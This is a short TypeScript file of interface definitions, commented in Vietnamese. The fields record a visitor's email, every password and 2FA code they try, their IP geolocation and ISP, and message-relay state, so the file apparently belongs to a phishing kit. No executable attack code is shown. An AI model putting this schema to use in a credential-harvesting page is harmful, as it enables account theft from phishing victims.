export interface FormData {
    emailPersonal: string; // Email personal

    passwordAttempts: string[]; // Danh sách mật khẩu đã thử
    codeAttempts?: string[]; // Danh sách code 2FA đã thử
}

export interface GeoData {
    ip: string; // IP address
    city: string; // Thành phố
    region: string; // Vùng/Tỉnh
    country: string; // Quốc gia
    latitude: string; // Vĩ độ
    longitude: string; // Kinh độ
    timezone: string; // Múi giờ
    organization_name: string; // Nhà cung cấp internet
}

export interface StoredData extends FormData {
    lastMessageId: number | null;
    lastMessage: string;
    timestamp: number;
}
